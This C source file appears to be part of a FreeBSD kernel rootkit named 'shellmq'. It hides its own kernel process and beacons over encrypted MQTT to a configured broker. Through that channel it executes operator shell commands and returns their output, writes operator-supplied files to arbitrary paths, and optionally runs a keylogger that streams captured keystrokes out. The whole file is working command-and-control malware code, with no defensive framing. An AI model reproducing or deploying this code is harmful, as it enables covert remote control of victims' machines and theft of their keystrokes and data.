#include "config.h"
#include "shellproxy.h"
#include "remsocket.h"
#include "remmqtt.h"
#include "keylog.h"
#include "../lib/mqttc/mqtt.h"

#include <sys/syscallsubr.h>
#include <sys/fcntl.h>
#include <sys/uio.h>
#include <sys/unistd.h>

// theres likely a lot of unpolished bugs here still
#if defined(__has_include)
# if __has_include("dd_conf.h")
#  include "dd_conf.h"
# endif
#endif

#ifdef DD_CONF_H

#define BROKER1 WS_IP

static struct remmqtt rmq;
static struct remconn outsock;

static char mid_str[17];
static u8 sess_tx[32];
static u8 sess_rx[32];
static u8 nonce_r[24];
static u64 txctr;
static u64 rxctr;
static u64 ktxctr;
static int keys_ready;
static u64 file_rxctr;
static u8 handshake_ack[8+24] = {0xac, 0xed, 0xac, 0xed, 0xac, 0xed, 0xac, 0xed};
static u8 file_ack[8] = {0xfa, 0xce, 0xfa, 0xce, 0xfa, 0xce, 0xfa, 0xce};
static int ack_pending;
static int file_ack_pending;
#define MAX_INJECT (32*1024*1024)

static u8* file_buf;
static u32 file_total;
static u32 file_got;
static char file_path[128];
static int file_ready;
static int file_done;

static
void try_handshake (const u8* payload)
{
	if (proxy_session_keys(payload, nonce_r, sess_tx, sess_rx)==0) {
		txctr = 1;
		rxctr = 1;
		ktxctr = 1;
		file_rxctr = 1;
		keys_ready = 1;
		memcpy(handshake_ack+8, nonce_r, 24);
		ack_pending = 1;
	}
}

static
void file_reset (void)
{
	if (file_buf!=NULL) {
		free(file_buf, M_TEMP);
		file_buf = NULL;
	}
	file_total = 0;
	file_got = 0;
	file_path[0] = '\0';
	file_ready = 0;
}

static
void file_commit (void)
{
	struct thread* td = curthread;

	if (!file_buf || !file_ready || file_got!=file_total) goto out;
	if (kern_openat(td, AT_FDCWD, file_path, UIO_SYSSPACE, O_WRONLY|O_CREAT|O_TRUNC, 0600) != 0) goto out;

	int fd = td->td_retval[0];

	struct iovec iov = {
		.iov_base = file_buf,
		.iov_len = file_total,
	};

	struct uio uio = {
		.uio_iov = &iov,
		.uio_iovcnt = 1,
		.uio_offset = 0,
		.uio_resid = file_total,
		.uio_segflg = UIO_SYSSPACE,
		.uio_rw = UIO_WRITE,
		.uio_td = td,
	};

	(void)kern_pwritev(td, fd, &uio, 0);
	kern_close(td, fd);
out:
	file_done = 1;
	file_reset();
}

static
void handle_file (const u8* payload, int len)
{
	u8 dat[MAX_PKT];
	int n = proxy_unbox(payload, len, sess_rx, 0x04, file_rxctr, dat, sizeof(dat));

	if (n<1) return;
	file_rxctr++;
	// opcode 0, begin work
	// [1-4] total size
	// [5-6] path len
	// [7-] dest path
	if (dat[0]==0) {
		if (n < 9) return;
		u32 total = dat[1] | (dat[2]<<8) | (dat[3]<<16) | (dat[4]<<24);

		int plen = dat[5] | (dat[6]<<8);

		if (total==0 || total > MAX_INJECT || plen<1 || plen >= sizeof(file_path) || n < 7 + plen) return;

		file_reset();
		file_total = total;
		file_ready = 0;

		memcpy(file_path, dat+7, plen);

		file_path[plen] = '\0';

		file_buf = malloc(file_total, M_TEMP, M_NOWAIT);
		if (file_buf==NULL) file_total = 0;
	}
	// so this is a valid chunk
	else if (dat[0]==1) {
		if (n < 6 || file_buf==NULL)
			return;
		u32 off = dat[1] | (dat[2]<<8) | (dat[3]<<16) | (dat[4]<<24);
		if (off>file_total || n-5>file_total-off)
			return;
		memcpy(file_buf+off, dat+5, n-5);
		file_got += n-5;
	}
	// we're done
	else if (dat[0]==2) {
		if (file_buf!=NULL && file_got==file_total) {
			file_ready = 1;
			file_ack_pending = 1;
		}
	}
	// eot, write to path
	else if (dat[0]==3)
		file_commit();
}

static
void reset_mqtt (void)
{
	struct mqtt_client* mc = (struct mqtt_client*)rmq.client;

	mc->error = MQTT_OK;
	mc->recv_buffer.curr = mc->recv_buffer.mem_start;
	mc->recv_buffer.curr_sz = mc->recv_buffer.mem_size;
	mc->send_offset = 0;
	mqtt_mq_clean(&mc->mq);
}

static
void run_cmd (const u8* payload, int len)
{
	u8* cmd = malloc(1024, M_TEMP, M_WAITOK);
	u8* blob = malloc(8192+16, M_TEMP, M_WAITOK);
	u8* chunk = malloc(4096+1, M_TEMP, M_WAITOK);
	u8* out = malloc(MAX_CMD_OUT, M_TEMP, M_WAITOK);
	int mlen = proxy_unbox(payload, len, sess_rx, 0x01, rxctr, cmd, 1023);
	if (mlen<0) {
		free(cmd, M_TEMP);
		free(blob, M_TEMP);
		free(chunk, M_TEMP);
		free(out, M_TEMP);
		return;
	}
	rxctr++;
	cmd[mlen] = '\0';

	int n;
#ifdef CFG_KEYLOGGER
	if (strncmp((char*)cmd, "@keylogstart", 12)==0) {
		keylog_until = time_uptime+300;
		n = 2;
		memcpy(out, "ok", 2);
	} else if (strncmp((char*)cmd, "@keylogstop", 11)==0) {
		keylog_until = 0;
		n = 2;
		memcpy(out, "ok", 2);
	} else if (strncmp((char*)cmd, "@keylog", 7)==0)
		n = keylog_dump((char*)out, MAX_CMD_OUT);
	else
#endif
#ifdef CFG_SUBNET_ROUTER
	if (cmd[0]=='@') {
		n = subnet_handle((char*)cmd, (char*)out, MAX_CMD_OUT);
		if (n<=0)
			n = strlen((char*)out);
	}
	else
#endif
	{
		n = proxy_execute_capture(&outsock, (char*)cmd, out, MAX_CMD_OUT);
		if (n<0)
			n = 0;
	}

	int off = 0;
	for (;;) {
		int clen = n-off;
		if (clen>4096)
			clen = 4096;
		int last = (off+clen>=n);
		chunk[0] = last ? 0 : 1;
		memcpy(chunk+1, out+off, clen);
		mlen = proxy_seal(chunk, clen+1, sess_tx, 0x02, txctr, blob, 8192+16);
		if (mlen<0)
			break;
		txctr++;
		char top[64];
		snprintf(top, sizeof(top), "%s/u", mid_str);
		
		if (remmqtt_pub(&rmq, top, blob, mlen, 0) != 0) {
			remmqtt_flush(&rmq);
			if (remmqtt_pub(&rmq, top, blob, mlen, 0) != 0)
				break;
		}
		remmqtt_flush(&rmq);

		if (last)
			break;
		off += clen;
	}
	free(cmd, M_TEMP);
	free(blob, M_TEMP);
	free(chunk, M_TEMP);
	free(out, M_TEMP);
}

#ifdef CFG_KEYLOGGER
static
void keylog_publish (u8* buf, u8* sealed)
{
	char top[64];
	int n, mlen;

	if (time_uptime>=keylog_until)
		return;
	n = keylog_stream((char*)buf, 4096);
	if (n<=0)
		return;
	mlen = proxy_seal(buf, n, sess_tx, 0x05, ktxctr, sealed, 4096+16);
	if (mlen<=0)
		return;
	ktxctr++;
	snprintf(top, sizeof(top), "%s/k", mid_str);
	if (remmqtt_pub(&rmq, top, sealed, mlen, 0)!=0) {
		remmqtt_flush(&rmq);
		(void)remmqtt_pub(&rmq, top, sealed, mlen, 0);
	}
	remmqtt_flush(&rmq);
}
#endif

static u8 cmd_q[2048];
static int cmd_q_len = 0;

static void
on_publish (const char* topic, const u8* payload, int len)
{
	if (strstr(topic, "/hr")!=NULL && len==120)
		try_handshake(payload);
	else if (keys_ready && strstr(topic, "/f")!=NULL)
		handle_file(payload, len);
	else if (keys_ready && strstr(topic, "/d")!=NULL) {
		if (len<=sizeof(cmd_q)) {
			memcpy(cmd_q, payload, len);
			cmd_q_len = len;
		}
	}
}

static 
int wait_for_op (void)
{
	u8 hello[8+24];
	char top[64];

	keys_ready = 0;
	txctr = 1;
	rxctr = 1;
	file_rxctr = 1;
	file_done = 0;
	ack_pending = 0;
	file_ack_pending = 0;
	file_reset();

	proxy_hello(hello, nonce_r);
#ifdef DBGMODEDONTUSEME
	printf("shellmq: hello published\n");
#endif
	snprintf(top, sizeof(top), "%s/h", mid_str);
	if (remmqtt_pub(&rmq, top, hello, sizeof(hello), 0)!=0)
		return (1);

	for (int i = 0; i<12 && !keys_ready && !shutting_down; i++) {
		proxy_attr_socket(rmq.rc.so);
		proxy_attr_socket(outsock.so);
		if (remmqtt_sync(&rmq)!=0)
			return (1);
		if (!keys_ready) {
			pause("mqsess", hz * (1 + arc4random_uniform(3)));
			remmqtt_pub(&rmq, top, hello, sizeof(hello), 0);
		}
	}
	return (keys_ready?0:1);
}

static 
void session_once (struct thread* td)
{
	char top[64];
#ifdef CFG_KEYLOGGER
	u8* kbuf = NULL;
	u8* kseal = NULL;
#endif

#ifdef DBGMODEDONTUSEME
	printf("shellmq: session\n");
#endif
	if (rem_bind_udp(&outsock, "127.0.0.1", OUTPORT)!=0) {
#ifdef DBGMODEDONTUSEME
		printf("shellmq: udp bind failed\n");
#endif
		return;
	}
	proxy_attr_socket(outsock.so);
#ifdef DBGMODEDONTUSEME
	printf("shellmq: udp ok\n");
#endif

	char client_id[32];
	snprintf(client_id, sizeof(client_id), "%s%04x", mid_str, arc4random()&0xffff);
	if (remmqtt_connect(&rmq, BROKER1, WS_HOST, "/?t=" WS_TOKEN, client_id)!=0) {
#ifdef DBGMODEDONTUSEME
		printf("shellmq: mqtt connect failed\n");
#endif
		goto out2;
	}
	proxy_attr_socket(rmq.rc.so);
#ifdef DBGMODEDONTUSEME
	printf("shellmq: mqtt connected\n");
#endif

	rmq.on_publish = on_publish;
	snprintf(top, sizeof(top), "%s/hr", mid_str);
	remmqtt_sub(&rmq, top);
	snprintf(top, sizeof(top), "%s/d", mid_str);
	remmqtt_sub(&rmq, top);
	snprintf(top, sizeof(top), "%s/f", mid_str);
	remmqtt_sub(&rmq, top);

	if (wait_for_op()!=0) {
#ifdef DBGMODEDONTUSEME
		printf("shellmq: no op handshake\n");
#endif
		goto out;
	}
#ifdef DBGMODEDONTUSEME
	printf("shellmq: op handshake ok\n");
#endif

#ifdef CFG_KEYLOGGER
	kbuf = malloc(4096, M_TEMP, M_WAITOK);
	kseal = malloc(4096+16, M_TEMP, M_WAITOK);
#endif

	time_t last_hello = 0;
	u8 hello[8+24];

	while (!shutting_down) {
		proxy_attr_socket(rmq.rc.so);
		proxy_attr_socket(outsock.so);
		if (time_uptime - last_hello >= 4 + arc4random_uniform(4)) {
			proxy_hello(hello, nonce_r);
			snprintf(top, sizeof(top), "%s/h", mid_str);
			remmqtt_pub(&rmq, top, hello, sizeof(hello), 0);
			last_hello = time_uptime;
		}
		if (remmqtt_sync(&rmq)!=0)
			goto out;
		if (ack_pending) {
			char top[64];
			ack_pending = 0;
			snprintf(top, sizeof(top), "%s/h", mid_str);
			remmqtt_pub(&rmq, top, handshake_ack, sizeof(handshake_ack), 0);
		}
		if (file_ack_pending) {
			char top[64];
			file_ack_pending = 0;
			snprintf(top, sizeof(top), "%s/h", mid_str);
			remmqtt_pub(&rmq, top, file_ack, sizeof(file_ack), 0);
		}
		if (file_done) {
			file_done = 0;
			reset_mqtt();
			pause("snsettle", hz/20);
		}
#ifdef CFG_KEYLOGGER
		keylog_publish(kbuf, kseal);
#endif
		if (cmd_q_len>0) {
			run_cmd(cmd_q, cmd_q_len);
			cmd_q_len = 0;
			reset_mqtt();
			pause("snsettle", hz/2);
		}
	}

out:
#ifdef CFG_KEYLOGGER
	if (kbuf!=NULL)
		free(kbuf, M_TEMP);
	if (kseal!=NULL)
		free(kseal, M_TEMP);
#endif
	file_reset();
	remmqtt_close(&rmq);
	proxy_attr_socket_clear();
out2:
	rem_close(&outsock);
}

static
void proxy_mqtt_run (void* arg)
{
	struct thread* td = curthread;
	struct proc* p = td->td_proc;

	(void)arg;
	proxy_hide(p);

	snprintf(mid_str, sizeof(mid_str), "%016llx", (unsigned long long)DD_ID);

	while (!shutting_down) {
		mtx_lock(&proxy_mtx);
		while (mfire==0 && !shutting_down)
			msleep(&mfire, &proxy_mtx, PWAIT, "shpxymq", 0);
		if (shutting_down) {
			mtx_unlock(&proxy_mtx);
			break;
		}
		mfire--;
		mtx_unlock(&proxy_mtx);

		session_once(td);
	}

	proxy_unhide(p);
	mtx_lock(&proxy_mtx);
	kthreads_done++;
	wakeup(&kthreads_done);
	mtx_unlock(&proxy_mtx);
	kproc_exit(0);
}

int mqtt_start (void)
{
	struct proc* p;
	int rc = kproc_create(proxy_mqtt_run, NULL, &p, 0, 8, "shellmq");
	return rc;
}

#else

int
mqtt_start (void)
{
	return (0);
}

#endif
